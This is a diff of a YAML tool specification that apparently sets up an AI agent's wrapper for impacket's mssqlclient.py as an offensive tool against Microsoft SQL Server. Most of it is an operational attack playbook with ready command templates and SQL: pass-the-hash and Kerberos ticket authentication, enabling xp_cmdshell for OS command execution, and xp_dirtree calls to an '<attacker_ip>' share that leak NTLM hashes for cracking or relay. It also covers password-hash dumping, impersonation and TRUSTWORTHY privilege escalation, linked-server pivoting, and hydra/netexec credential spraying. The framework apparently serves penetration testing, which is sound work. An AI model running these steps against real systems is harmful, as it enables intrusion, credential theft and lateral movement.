@@ -1,9 +1,56 @@
 name: mssql
-version: "1.0"
-description: "Microsoft SQL Server exploitation via impacket TDS client. 7 methods: query (execute arbitrary SQL), enum (enumerate databases, tables, users, linked servers, assemblies, impersonation targets), xp_cmdshell (enable and execute OS commands), xp_dirtree (read filesystem or trigger NTLM authentication for relay), linked_query (execute queries through linked servers via OPENQUERY), extract_assembly (retrieve CLR assembly DLLs), escalate (attempt privilege escalation via impersonation or trustworthy DB). Supports SQL and Windows authentication plus pass-the-hash. Stateless — connection params provided with every call. For MySQL use mysql. For credential relay use impacket-relay."
-image: "ghcr.io/silicon-works/mcp-tools-mssql:latest"
+kind: cli
+binary: mssqlclient.py
+version: "0.12.x"
+description: >
+  Microsoft SQL Server (MSSQL) client from impacket — `mssqlclient.py`. Used
+  to connect to a Microsoft SQL Server with recovered credentials, dump
+  databases / tables / hashes, execute OS commands via `xp_cmdshell`, trigger
+  NTLM authentication via `xp_dirtree` for relay attacks, traverse linked
+  servers via `OPENQUERY`, extract CLR assemblies, and attempt privilege
+  escalation via impersonation or trustworthy DBs.
+
+  Argv form is impacket-canonical: `mssqlclient.py [domain/]user[:password]@host
+  [-windows-auth] [-k] [-no-pass] [-hashes :NTHASH] [-aesKey HEX] [-dc-ip IP]
+  [-target-ip IP] [-port N] [-db NAME] [-instance NAME] [-file PATH] [-debug]
+  [-row-count|-no-row-count] [-show]`. The positional target uses the same
+  `[domain/]user[:password]@host` form as every other impacket sub-binary
+  (secretsdump, psexec, wmiexec, smbclient) — the same regex applies for
+  target extraction.
+
+  Critical anomaly: mssqlclient.py has NO `-e <query>` non-interactive flag
+  like the mysql client. To run a query non-interactively the agent must
+  EITHER pass `-file <sql-path>` (the canonical form, write the SQL to
+  /session/<name>.sql first) OR feed queries via stdin (use the `stdin_data`
+  parameter on run_cli). Without `-file` and without stdin_data, the binary
+  opens an interactive prompt that hangs the container.
+
+  `-windows-auth` is REQUIRED for AD/Windows authentication. Without it,
+  mssqlclient defaults to SQL Server Authentication (login-based, like the
+  classic `sa` account). For pass-the-hash (`-hashes :NTHASH`), `-windows-auth`
+  must be set; the leading colon in `-hashes` is significant (LM half is empty,
+  NT-hash-only is the standard form).
+
+  Default port is 1433. Named SQL instances bind to dynamic ports — the agent
+  passes `-instance <name>` (NOT a port) and mssqlclient resolves the dynamic
+  port via the SQL Browser service on UDP/1434.
+
+  The legacy method handlers (query, enum, xp_cmdshell, xp_dirtree, linked_query,
+  extract_assembly, escalate) auto-inherit run_cli from BaseMCPServer
+  (mcp-common 0.3.0); kind:cli is the new default. The seven methods are
+  preserved as the legacy / rollback path per SKILL #21.
+
+image: ghcr.io/silicon-works/mcp-tools-mssql:latest
 image_size_mb: 350
-timeout_seconds: 300
+
+# Dual-clock model — connection + simple query is sub-second; large dumps on
+# tables with millions of rows OR `xp_cmdshell` calls running long shell
+# commands can take many minutes. idle catches a wedged interactive prompt
+# (no -file, no stdin); max_runtime is the hard cap.
+idle_timeout_seconds: 300       # 5 min silence == wedged (likely interactive prompt)
+max_runtime_seconds: 3600       # 1 h hard cap — covers worst-case full-table dumps
+timeout_seconds: 3600
+allow_multi_target: false       # one host per call
 
 capabilities:
   - mssql_query
@@ -11,6 +58,7 @@ capabilities:
   - linked_server_traversal
   - assembly_extraction
   - privilege_escalation
+  - ntlm_relay_trigger
 
 phases:
   - enumeration
@@ -27,220 +75,323 @@ resources:
 
 routing:
   use_for:
-    - "connect to and query Microsoft SQL Server"
-    - "execute OS commands via xp_cmdshell on MSSQL"
-    - "enumerate MSSQL databases, tables, users, linked servers, and CLR assemblies"
-    - "traverse linked MSSQL servers via OPENQUERY"
-    - "trigger NTLM authentication via xp_dirtree to UNC paths (for relay attacks)"
-    - "extract .NET DLLs from MSSQL CLR assemblies for decompilation"
-    - "attempt MSSQL privilege escalation via impersonation or trustworthy databases"
+    - "Connect to and query Microsoft SQL Server with recovered credentials"
+    - "Execute OS commands via xp_cmdshell on MSSQL (sysadmin)"
+    - "Enumerate MSSQL databases, tables, users, linked servers, and CLR assemblies"
+    - "Traverse linked MSSQL servers via OPENQUERY for lateral movement"
+    - "Trigger NTLM authentication via xp_dirtree to UNC paths (for relay attacks)"
+    - "Extract .NET DLLs from MSSQL CLR assemblies for decompilation"
+    - "Attempt MSSQL privilege escalation via impersonation or trustworthy databases"
+    - "Test recovered SA / Windows-auth credentials against MSSQL on port 1433"
+    - "Pass-the-hash to MSSQL via -hashes :NTHASH -windows-auth"
+    - "Kerberos auth to MSSQL via -k -no-pass with cached TGT"
   never_use_for:
-    - "MySQL databases (use mysql)"
+    - "MySQL or MariaDB databases (use mysql)"
     - "MongoDB databases (use mongodb)"
+    - "PostgreSQL databases (use psql)"
     - "SQL injection testing (use sqlmap)"
-    - "NTLM relay attacks (use impacket-relay — mssql only triggers the auth)"
+    - "NTLM relay listener (use impacket-relay / impacket-ntlmrelayx — mssql only TRIGGERS the auth)"
+    - "Brute-forcing MSSQL passwords (use hydra mssql or netexec mssql)"
+    - "Port scanning to discover MSSQL instances (use nmap -p 1433 -sV --script=ms-sql-info)"
   triggers:
-    - MSSQL
-    - SQL Server
-    - Microsoft SQL
-    - xp_cmdshell
-    - linked server
-    - OPENQUERY
-    - CLR assembly
-    - port 1433
-    - xp_dirtree
-    - sa password
+    - "MSSQL"
+    - "mssqlclient"
+    - "mssqlclient.py"
+    - "SQL Server"
+    - "Microsoft SQL"
+    - "TDS protocol"
+    - "xp_cmdshell"
+    - "xp_dirtree"
+    - "linked server"
+    - "OPENQUERY"
+    - "CLR assembly"
+    - "port 1433"
+    - "named instance"
+    - "sa password"
+    - "SQL Server Authentication"
+    - "Windows Authentication"
+    - "windows-auth"
+    - "trustworthy database"
+    - "EXECUTE AS LOGIN"
+    - "IMPERSONATE permission"
   prefer_over: []
 
 see_also:
   - tool: mysql
-    reason: Use mysql for MySQL databases. Use mssql for Microsoft SQL Server. Different protocols and exploitation techniques.
+    reason: "Use mysql for MySQL / MariaDB databases (port 3306, different protocol). Use mssql for Microsoft SQL Server (port 1433, TDS protocol). The clients are not interchangeable — mysql client cannot speak TDS, mssqlclient cannot speak the MySQL wire protocol."
+  - tool: impacket
+    reason: "mssqlclient.py is one of the 47 sub-binaries in the impacket toolkit. The mssql image is INDEPENDENT (built from kalilinux/kali-rolling + pip install impacket) so this tool can iterate without dragging the full impacket image. Use the impacket tool when you need other sub-binaries (secretsdump, psexec, GetUserSPNs, etc.) — same target syntax `[domain/]user[:password]@host`."
+  - tool: sqlmap
+    reason: "Use sqlmap for HTTP-side SQL injection (input parameter → SQL query in the application; supports MSSQL via --dbms=mssql). Use mssql client when you have direct port-1433 access AND credentials. Complementary: sqlmap may hand you an `sa` hash from `master..syslogins` or a useful CVE; mssql client lets you use those creds for direct enumeration without going through the web layer."
+  - tool: hydra
+    reason: "Use `hydra mssql -L users.txt -P passwords.txt <host>` to brute-force MSSQL credentials. Once a credential pair is found, hand it off to mssql client for enumeration. hydra's mssql module is purpose-built for credential spraying."
+  - tool: netexec
+    reason: "Use `netexec mssql -u <user> -p <pass> --query 'SELECT @@VERSION' <host>` for credential spraying across multiple MSSQL servers in parallel. mssql client is single-host. Once a successful spray hit is found, mssql client is the deeper-enumeration tool."
+  - tool: nmap
+    reason: "Use `nmap -p 1433 -sV --script=ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info <host>` to fingerprint MSSQL version and try anonymous access BEFORE attempting credentialed connection. nmap's ms-sql NSE scripts surface version, named instances (via UDP 1434 SQL Browser), and empty-password reachability without auth."
   - tool: ilspy
-    reason: After extracting CLR assemblies with mssql extract_assembly, decompile the DLLs with ilspy to find hardcoded credentials.
+    reason: "After extracting CLR assemblies via `mssqlclient.py ... -file extract.sql` (where extract.sql queries sys.assembly_files for content), decode the hex blob, and decompile the resulting DLL with ilspy to find hardcoded credentials, business logic, or further attack surface."
   - tool: responder
-    reason: Use mssql xp_dirtree to trigger NTLM authentication to your IP, and responder to capture the Net-NTLMv2 hash.
-  - tool: impacket-relay
-    reason: Use mssql xp_dirtree to trigger NTLM auth, and impacket-relay to relay it for lateral movement.
+    reason: "Use `xp_dirtree '\\\\<attacker_ip>\\share'` (via -file or stdin) to trigger NTLM authentication from the MSSQL service account to your responder listener, capturing the Net-NTLMv2 hash for offline cracking with john / hashcat."
+  - tool: impacket
+    reason: "Use mssql + xp_dirtree to trigger NTLM auth, then impacket-ntlmrelayx (Tier B, MCP transport) to relay the captured auth for lateral movement (e.g., to a different SMB or LDAP target)."
+  - tool: john
+    reason: "Crack hashes dumped from `master..syslogins` (older MSSQL) or `sys.sql_logins` (modern MSSQL). Format: `--format=mssql05` for SQL 2005+. Hashes appear as `0x0100<salt><sha1>` blobs."
+  - tool: hashcat
+    reason: "GPU cracker. Modes 131 (mssql), 132 (mssql 2005), 1731 (mssql 2012/2014). Use after dumping `password_hash` from `sys.sql_logins`."
 
-methods:
+# ── kind:cli specific sections ──────────────────────────────────────
+
+target_extraction:
+  # mssqlclient.py uses the same canonical impacket positional target form:
+  #   `[domain/]user[:password]@host`
+  # Examples:
+  #   mssqlclient.py 'sa:Pa55@10.10.10.5'                                 -> host=10.10.10.5
+  #   mssqlclient.py 'corp.local/admin:Pass123@dc01.corp.local' -windows-auth -> host=dc01.corp.local
+  #   mssqlclient.py 'corp/svc@10.10.10.5' -k -no-pass -dc-ip 10.10.10.5 -> host=10.10.10.5
+  #
+  # The regex carefully:
+  #   - Optionally consumes `domain/`  (^(?:[^/@\s]+/)?)
+  #   - Consumes `user[:password]`     ([^@\s]+)
+  #   - Captures host after @          @([^:/?#\s]+)   <- group 1
+  #
+  # Precedence (first match wins):
+  #   1. positional_match — the canonical form (almost every invocation)
+  #   2. flag_value -target-ip — override when SPN host differs from network host (Kerberos)
+  #   3. flag_value -dc-ip — fallback when no positional/-target-ip (rare for mssql; covers
+  #      Kerberos auth flows where target = DC = MSSQL host)
+  - rule: "positional_match"
+    pattern: '^(?:[^/@\s]+/)?[^@\s]+@([^:/?#\s]+)'
+    group: 1
+    parse_as: "raw"
+  - rule: "flag_value"
+    flag: "-target-ip"
+    parse_as: "raw"
+  - rule: "flag_value"
+    flag: "-dc-ip"
+    parse_as: "raw"
+
+# mssql client has no bulk-target ingest flag — single host per call. No
+# per-flag rejection needed.
+reject_flags: []
+reject_flags_reason: "mssqlclient.py has no list-of-targets flag (-iL / --target-file analog). Single host per call. The -hashes / -aesKey / -file value-flag traps are handled by value_flags; no scope-corruption risk that warrants a reject."
+
+# Per-tool value-taking flags whose values must NOT be confused with
+# positional targets. Verified against `mssqlclient.py --help` (impacket
+# 0.12.x — current upstream).
+value_flags:
+  # ── Auth / Kerberos ──
+  - "-hashes"          # NTLM hash 'LM:NT' or ':NT' (leading colon = empty LM)
+  - "-aesKey"          # Kerberos AES128 (32 hex) or AES256 (64 hex) key
+  - "-k"               # boolean — use Kerberos auth (reads ccache from KRB5CCNAME)
+  - "-no-pass"         # boolean — don't prompt for password (use with -k or -hashes)
+  - "-windows-auth"    # boolean — use Windows / NTLM auth (NOT SQL Server Auth)
+  # ── Targeting ──
+  - "-port"            # TCP port (default 1433)
+  - "-target-ip"       # SPN-resolution override (Kerberos)
+  - "-dc-ip"           # KDC IP for Kerberos lookup
+  # ── Query / DB ──
+  - "-db"              # default database (USE)
+  - "-instance"        # named SQL instance (NOT a port — resolves via UDP 1434 SQL Browser)
+  - "-file"            # SQL file to execute (the canonical non-interactive form)
+  - "-command"         # inline SQL statement; repeatable (legacy mcp-server.py used this; alternative to -file/stdin)
+  # ── Output / behavior ──
+  - "-debug"           # boolean — verbose stderr
+  - "-row-count"       # boolean — show row count footer (default)
+  - "-no-row-count"    # boolean — suppress row count footer
+  - "-show"            # boolean — echo executed queries
+
+usage_patterns:
+  - name: "Version check via -file (smoke test)"
+    command: "{auth_target} -windows-auth -file /session/version.sql"
+    when: "Confirm the credential pair works and surface the SQL Server version. The agent first writes `SELECT @@VERSION;` to /session/version.sql via the `write` tool, then calls run_cli with this argv. The version string surfaces SQL Server build (e.g., 'Microsoft SQL Server 2019 (RTM-CU18) ... 15.0.4198.2') — useful for version-specific exploit paths (CVEs, hotfix levels). VERSION queries also confirm the credential pair works without committing to a longer run."
+
+  - name: "List databases via -file"
+    command: "{auth_target} -windows-auth -file /session/list-dbs.sql"
+    when: "First enumeration step after auth — list every database. Agent writes `SELECT name FROM sys.databases;` to /session/list-dbs.sql, then this argv lists all DBs visible to the auth user. System DBs (master, tempdb, model, msdb) are visible to anyone authenticated; application DBs require at least the `db_datareader` role on each."
+
+  - name: "Pass-the-hash via -hashes :NTHASH"
+    command: "{auth_target} -hashes :{nt_hash} -windows-auth -file /session/dump.sql"
+    when: "When credentials are an NT hash (from secretsdump, lsass, etc.) instead of a cleartext password. CRITICAL: -hashes value has a LEADING COLON (`-hashes :31d6cfe0...`) — the LM half is empty (modern NT-only). -windows-auth is REQUIRED for the Windows auth path; without it, mssqlclient assumes SQL Server Authentication (login-based) which doesn't have a hash form."
+
+  - name: "Kerberos auth via -k -no-pass (with cached TGT)"
+    command: "{auth_target} -k -no-pass -dc-ip {dc_ip} -file /session/q.sql"
+    when: "Kerberos pass-the-ticket. Prerequisite: a TGT must already be in the ccache pointed to by KRB5CCNAME (typically `/session/<user>.ccache`, written by impacket-getTGT). -k says 'use Kerberos', -no-pass says 'don't prompt for password'. -dc-ip pins the KDC for lookup. Use this when the target is hardened (NTLM disabled / require_secure_transport equivalent) — same pattern as impacket-secretsdump."
+
+  - name: "SQL Server Authentication (no -windows-auth, login-based)"
+    command: "{auth_target} -file /session/q.sql"
+    when: "When the credential is a SQL Server LOGIN (the classic `sa` account, or any login defined in `sys.sql_logins`) NOT a Windows / AD account. Omit -windows-auth — mssqlclient defaults to SQL Server Authentication. This path doesn't go through Kerberos / NTLM at all; the password is sent over the TDS channel directly. Common for compromised dev / staging boxes where `sa:sa`, `sa:Password1`, or `sa:<companyname>123` is the recovered cred."
+
+  - name: "Stdin-fed query (alternative to -file)"
+    command: "{auth_target} -windows-auth"
+    when: "Alternative to -file when writing a temporary file is undesirable or when the agent wants to chain queries dynamically. Use run_cli's `stdin_data` parameter to feed the SQL on stdin (e.g., stdin_data=`SELECT @@VERSION;\\nGO\\nexit\\n`). Each query is followed by `GO` (the T-SQL batch separator) and the session ends with `exit`. Without stdin_data AND without -file, mssqlclient opens an interactive prompt and hangs the container — idle_timeout=300s catches that."
+
+  - name: "Named instance (NOT a port — resolves via UDP 1434 SQL Browser)"
+    command: "{auth_target} -windows-auth -instance {instance_name} -file /session/q.sql"
+    when: "When the target SQL Server is a NAMED INSTANCE (e.g., `MSSQLSERVER2019`, `SQLEXPRESS`) not the default instance. Named instances bind to a DYNAMIC port that mssqlclient discovers by querying the SQL Browser service on UDP/1434. Pass `-instance <name>` (NOT `-port`) — the dynamic port is resolved automatically. If UDP/1434 is firewalled, the resolution fails — fall back to nmap to find the dynamic port and pass `-port` directly."
+
+  - name: "Non-default port (default 1433)"
+    command: "{auth_target} -windows-auth -port {port} -file /session/q.sql"
+    when: "When the SQL Server listens on a non-default port (commonly 1434, 14330, or a randomized port for hardening). Pair with nmap to discover (`nmap -p 1-65535 --script=ms-sql-info`). Note: -port is for the DEFAULT instance bound to a non-1433 port; for NAMED instances use -instance instead (the named instance discovery handles its dynamic port)."
+
+  - name: "Default database via -db"
+    command: "{auth_target} -windows-auth -db {database} -file /session/q.sql"
+    when: "Set the default database before running the file (equivalent to `USE <database>` at the start of every query). Used for application-DB enumeration after `SHOW DATABASES`-equivalent surfaced an interesting target. Common DBs: ApplicationDB, prod, staging, hr, finance, customers."
+
+  - name: "xp_cmdshell OS command execution (sysadmin required)"
+    command: "{auth_target} -windows-auth -file /session/cmdshell.sql"
+    when: "Execute OS commands via xp_cmdshell. Prerequisite: sysadmin role (or membership in a role that grants EXECUTE on xp_cmdshell). The /session/cmdshell.sql file should contain: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell '<cmd>';` — three statements: enable advanced opts, enable xp_cmdshell, then exec the command. Output is appended to the SQL result stream."
+
+  - name: "xp_dirtree NTLM trigger (for relay attacks)"
+    command: "{auth_target} -windows-auth -file /session/dirtree-ntlm.sql"
+    when: "Trigger NTLM authentication from the MSSQL service account to your attacker-controlled UNC path. The /session/dirtree-ntlm.sql file should contain: `EXEC xp_dirtree '\\\\\\\\<attacker_ip>\\\\share', 1, 1;`. The MSSQL service account (often `LOCAL SERVICE`, `NETWORK SERVICE`, or a domain svc account) authenticates to the UNC path with Net-NTLMv2 — captureable by responder for offline crack OR relayable by impacket-ntlmrelayx for lateral movement. Pair with the responder/impacket-ntlmrelayx tools."
+
+  - name: "Linked server traversal via OPENQUERY"
+    command: "{auth_target} -windows-auth -file /session/linked-query.sql"
+    when: "Pivot from one MSSQL server to a LINKED MSSQL server that the current server has been configured to trust. The SQL file contains: `SELECT * FROM OPENQUERY([LINKED_SERVER_NAME], 'SELECT @@VERSION');`. Useful for lateral movement to higher-privilege MSSQL instances — many corporations link a low-priv app DB to a high-priv reporting DB, and the OPENQUERY runs under the linked-server's login context (often a dba/admin account). Use `EXEC sp_linkedservers;` first to enumerate links."
+
+  - name: "Hash dump from sys.sql_logins (post-exploit)"
+    command: "{auth_target} -windows-auth -file /session/dump-hashes.sql -no-row-count"
+    when: "After gaining sysadmin, dump the password hashes for SQL Server logins for offline cracking. The SQL file contains: `SELECT name, password_hash FROM sys.sql_logins WHERE password_hash IS NOT NULL;`. Hashes are SQL Server format (0x0100<salt><sha1> for SQL 2005+; mode 132 in hashcat, --format=mssql05 in john). -no-row-count strips the trailing 'X rows affected' line for cleaner parsing."
+
+  - name: "Debug mode (failure diagnosis)"
+    command: "{auth_target} -windows-auth -debug -file /session/q.sql"
+    when: "When a connection or query fails with terse stderr — pass -debug to get the full impacket protocol trace (TDS packet hex dumps, login negotiation details, NTLMSSP message contents). Useful for diagnosing TLS / NTLM / SPN issues. The output is verbose; redirect or grep for the specific layer (TDSLogin, NTLMSSP, GSSAPI). For Kerberos failures, -debug reveals the exact KDC reject code."
+
+  - name: "Show executed queries (verbose audit)"
+    command: "{auth_target} -windows-auth -show -file /session/audit.sql"
+    when: "When the agent wants to record every executed statement in the output (mssqlclient by default echoes only the result, not the query). -show prefixes each result block with the SQL that produced it — useful for downstream parsing where the agent needs to correlate result rows back to source statements in a multi-statement -file."
+
+  - name: "Privilege escalation via EXECUTE AS LOGIN"
+    command: "{auth_target} -windows-auth -file /session/privesc-impersonate.sql"
+    when: "When the auth user is not sysadmin but has IMPERSONATE permission on a higher-privileged login (commonly `sa`). The SQL file contains: `SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');`. The IMPERSONATE permission is granted explicitly via `GRANT IMPERSONATE ON LOGIN::sa TO <user>` — common misconfiguration."
+
+  - name: "Privilege escalation via trustworthy DB"
+    command: "{auth_target} -windows-auth -file /session/privesc-trustworthy.sql"
+    when: "When a database has TRUSTWORTHY ON and a non-sysadmin owner with sysadmin server role members nested. The SQL file contains: `SELECT name FROM sys.databases WHERE is_trustworthy_on = 1;` to find candidates, then `USE <trustworthy_db>; EXEC <module_with_dbo_owner>;` to abuse. Common TRUSTWORTHY+dbo escalation: msdb (default trustworthy ON), then any module with EXTERNAL ACCESS or UNSAFE permission set runs as sysadmin."
+
+output_formats:
+  # mssqlclient.py is text-only on stdout. Each query result is rendered as a
+  # whitespace-separated table (NOT TSV — column widths are dynamic). Multi-row
+  # output is one line per row. There is NO native JSON / XML / TSV / CSV
+  # output flag. The agent must parse the whitespace-aligned table or use
+  # post-processing.
+  - flag: ""
+    format: "text"
+    preferred: false
+    notes: "Default — pretty whitespace-aligned table. Column widths vary by content. Multi-row queries produce one line per row. NO native machine-readable output flag exists."
+  - flag: "-no-row-count"
+    format: "text_no_footer"
+    preferred: false
+    notes: "Suppress the 'X rows affected' trailing line. Cleaner for downstream pipe-parsing."
+  - flag: "-show"
+    format: "text_with_query_echo"
+    preferred: false
+    notes: "Prefix each result block with the SQL that produced it. Useful for multi-statement -file when the agent needs to correlate statements with results."
+  - flag: "-debug"
+    format: "verbose_protocol_trace"
+    preferred: false
+    notes: "Print TDS protocol-level diagnostics on stderr. Useful for TLS / NTLM / Kerberos debugging; not for normal query parsing."
+
+common_options:
+  connection:
+    - "[domain/]user[:password]@host: positional target form. Same as every impacket sub-binary — `corp.local/admin:Pa55@10.10.10.5`. Quote it if the password contains shell metacharacters."
+    - "-port N: TCP port for default instance (default 1433). Use -port for non-default DEFAULT instances; use -instance for NAMED instances (different mechanism)."
+    - "-target-ip IP: override SPN-resolution host (Kerberos). Use when -k auth fails because the SPN binding doesn't match the connection host (e.g., behind a load balancer)."
+    - "-dc-ip IP: KDC for Kerberos lookup. Required when -k is set and DNS doesn't have an SRV record for the realm. Same KDC convention as every other impacket binary."
+    - "-instance NAME: named SQL instance (e.g., MSSQLSERVER2019, SQLEXPRESS). Resolves dynamic port via UDP/1434 SQL Browser."
+  authentication:
+    - "-windows-auth: REQUIRED for Windows / AD authentication. Without this flag, mssqlclient uses SQL Server Authentication (login-based, no domain). Pass-the-hash and Kerberos paths both REQUIRE -windows-auth."
+    - "-k: Kerberos auth (reads ccache from KRB5CCNAME env). Pair with -no-pass and -dc-ip."
+    - "-no-pass: don't prompt for password (use with -k for ticket auth, or with -hashes for pass-the-hash)."
+    - "-hashes :NTHASH: pass-the-hash. LEADING COLON is significant — LM half is empty, NT half is the 32-hex hash. Pair with -windows-auth."
+    - "-aesKey HEX: Kerberos AES128 (32 hex) or AES256 (64 hex) key. Alternative to -hashes for Kerberos pass-the-key."
   query:
-    description: "Execute an arbitrary SQL query against MSSQL Server. Returns parsed tabular results."
-    when_to_use: "General SQL interaction — enumerate data, check permissions, read tables. First try: 'SELECT @@version', 'SELECT DB_NAME()', 'SELECT SYSTEM_USER', 'SELECT IS_SRVROLEMEMBER(''sysadmin'')'."
-    params:
-      host:
-        type: string
-        required: true
-        description: "MSSQL server hostname or IP."
-      username:
-        type: string
-        required: true
-        description: "SQL or Windows username."
-      password:
-        type: string
-        description: "Password."
-      sql:
-        type: string
-        required: true
-        description: "SQL query to execute."
-      port:
-        type: integer
-        default: 1433
-        description: "MSSQL port."
-      windows_auth:
-        type: boolean
-        default: false
-        description: "Use Windows authentication."
-    returns:
-      rows:
-        type: array
-        description: "Query results as list of row dicts."
-      row_count:
-        type: integer
-        description: "Number of rows returned."
+    - "-file PATH: execute SQL from file (THE canonical non-interactive form — there is no -e). Write the SQL to /session/<name>.sql first via the `write` tool."
+    - "-db NAME: default database (USE NAME at session start)."
+    - "stdin_data: alternative to -file — feed SQL via run_cli's stdin_data parameter. Statements separated by newline; end with `GO` (T-SQL batch separator) and `exit` to close the session cleanly."
+  output:
+    - "-debug: verbose protocol trace on stderr. Diagnose TLS / NTLM / Kerberos issues."
+    - "-show: echo each executed SQL statement before its result. Useful for multi-statement -file."
+    - "-row-count: show 'X rows affected' footer (default behavior — listed for completeness)."
+    - "-no-row-count: suppress 'X rows affected' footer. Cleaner for parseable pipe output."
 
-  enum:
-    description: "Enumerate MSSQL server — databases, tables, users, linked servers, CLR assemblies, impersonation targets."
-    when_to_use: "After gaining MSSQL access — discover the attack surface. Check linked_servers for lateral movement, assemblies for .NET DLLs with credentials, impersonation for privilege escalation."
-    params:
-      host:
-        type: string
-        required: true
-        description: "MSSQL server hostname or IP."
-      username:
-        type: string
-        required: true
-        description: "SQL or Windows username."
-      password:
-        type: string
-        description: "Password."
-      target:
-        type: string
-        default: "all"
-        description: "What to enumerate: databases, tables, users, linked_servers, assemblies, impersonation, all."
-    returns:
-      results:
-        type: object
-        description: "Enumeration results grouped by category."
+gotchas:
+  - "TARGET SYNTAX IS [domain/]user[:password]@host — same as every impacket sub-binary (secretsdump, psexec, wmiexec, smbclient, lookupsid). The same regex applies for target extraction. Quote the positional if the password contains shell metacharacters: `'corp/admin:Pa$$w0rd!@10.10.10.5'`."
+  - "-windows-auth IS REQUIRED FOR DOMAIN AUTH — without this flag, mssqlclient assumes SQL Server Authentication (login-based, no domain). Pass-the-hash (`-hashes`) and Kerberos (`-k`) BOTH require -windows-auth. The SQL Server Auth path is for the classic `sa` / `dba` / `appuser` LOGINS (not domain accounts)."
+  - "NO -e <query> NON-INTERACTIVE FLAG — unlike the mysql client, mssqlclient.py has NO `-e <query>` shortcut. The agent MUST EITHER (a) write the SQL to /session/<name>.sql via the `write` tool first and pass `-file /session/<name>.sql`, OR (b) feed queries via run_cli's `stdin_data` parameter (statements separated by newline, end with `GO\\nexit\\n`). Without -file AND without stdin_data, mssqlclient opens an interactive prompt and hangs the container — idle_timeout=300s catches it but is slow."
+  - "-hashes HAS A LEADING COLON FOR NT-ONLY — the canonical form is `-hashes :31d6cfe0d16ae931b73c59d7e0c089c0` (empty LM half + NT hash). Modern Windows targets only have the NT half. Without the leading colon, mssqlclient parses the value as `LM_PART:NT_PART` and may fail with a malformed-hash error if the LM and NT parts aren't both present."
+  - "DEFAULT PORT IS 1433 — for non-default DEFAULT-instance ports, use `-port N`. For NAMED instances (e.g., MSSQLSERVER2019, SQLEXPRESS), use `-instance <name>` instead (named instances bind to dynamic ports resolved via UDP/1434 SQL Browser). DON'T pass both -port and -instance to the same call — they're alternative mechanisms."
+  - "NAMED-INSTANCE DISCOVERY USES UDP/1434 — the SQL Browser service answers on UDP/1434 with the dynamic port for each named instance. If UDP/1434 is firewalled (common on hardened targets), -instance fails — fall back to nmap (`nmap -p 1-65535 --script=ms-sql-info <host>`) to find the dynamic port and pass `-port <discovered_port>` directly."
+  - "KERBEROS REQUIRES KRB5CCNAME ENV — for `-k -no-pass`, a TGT must already be in the ccache pointed to by KRB5CCNAME (typically /session/<user>.ccache, written by impacket-getTGT in a prior call). The kind:cli image bundles krb5-user + libkrb5-dev so kinit / GSSAPI bindings work; verify cli_in_container forwards KRB5CCNAME (open question — same as the impacket tool)."
+  - "CLOCK SKEW (KRB_AP_ERR_SKEW) — Kerberos auth fails when the host clock differs from the DC by >5min. The kind:cli image has NO libfaketime (the original MCP-server image had FAKETIME wiring; this image does not). Sync the host clock (chronyc / rdate) or skip Kerberos and use -hashes pass-the-hash instead."
+  - "WITHOUT -file, mssqlclient OPENS AN INTERACTIVE PROMPT — the container has no stdin (unless run_cli's `stdin_data` is used), so the binary blocks forever on the `SQL>` prompt. ALWAYS pass either -file PATH or stdin_data. There is no `--non-interactive` flag — -file IS the non-interactive escape."
+  - "OUTPUT IS WHITESPACE-ALIGNED TEXT, NOT TSV/JSON — mssqlclient renders each query result as a column-aligned ASCII table. Column widths vary by content. There is NO --tsv / --json / --csv flag. Post-processing requires regex or width-based slicing. For structured downstream use, prefer one column per query (single-column result is trivial to parse line-by-line)."
+  - "xp_cmdshell ENABLE-THEN-EXEC IS THREE STATEMENTS — to run an OS command from a fresh session: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell '<cmd>';`. The first two enable advanced options and xp_cmdshell respectively (each requires its own RECONFIGURE). Skipping any of the three causes the third to fail with 'xp_cmdshell is not a recognized option' or 'must enable xp_cmdshell'."
+  - "xp_dirtree UNC PATH NEEDS DOUBLE BACKSLASHES IN SQL — `EXEC xp_dirtree '\\\\\\\\attacker\\\\share', 1, 1;`. T-SQL strings escape backslashes by doubling, AND the UNC form needs `\\\\<host>\\<share>` so the literal in the SQL file ends up `\\\\\\\\<host>\\\\<share>` (eight backslashes total in the source for two UNC backslashes after parse). Run a small dry-run query first to verify the UNC form was parsed correctly: `SELECT '\\\\\\\\<host>\\\\<share>';`."
+  - "LINKED-SERVER OPENQUERY USES SINGLE QUOTES INSIDE SINGLE QUOTES — `SELECT * FROM OPENQUERY([LINK], 'SELECT @@VERSION');`. The inner query's quotes must be doubled to embed in the outer string: `SELECT * FROM OPENQUERY([LINK], 'SELECT name FROM sys.databases WHERE name = ''master''');`. Use the EXEC alternative for complex queries: `EXEC ('SELECT @@VERSION') AT [LINK];`."
+  - "TRUSTWORTHY DB ESCALATION REQUIRES dbo OWNER WITH SYSADMIN — the path is: identify trustworthy DBs (`SELECT name FROM sys.databases WHERE is_trustworthy_on = 1`), find the owner (`SELECT suser_sname(owner_sid) FROM sys.databases WHERE name = '<db>'`), check if the owner is sysadmin (`SELECT IS_SRVROLEMEMBER('sysadmin', '<owner>')`). If yes, any module / sproc with EXTERNAL ACCESS or UNSAFE permission set runs with sysadmin privileges via the dbo chain."
+  - "SQL_LOGINS IS THE HASH TABLE FOR MODERN MSSQL — `sys.sql_logins.password_hash` holds the salted SHA-1 hashes for SQL-Server-authenticated logins. Older guides reference `master..syslogins.password` (deprecated since SQL 2005). Hash format `0x0100<salt><sha1>` — hashcat mode 132 (SQL 2005+), john --format=mssql05."
+  - "EXIT CODE — mssqlclient.py exits 0 on successful connect-and-execute (even if the query produced an SQL Server error like 'Msg 208, Level 16'). It exits non-zero only on connection / auth / argparse failures. The exit code does NOT reliably distinguish 'connected but query failed' from 'query succeeded' — pattern-match stderr/stdout for `Msg \\d+, Level \\d+` SQL-error format AND for `Login failed` / `STATUS_LOGON_FAILURE` auth-error markers."
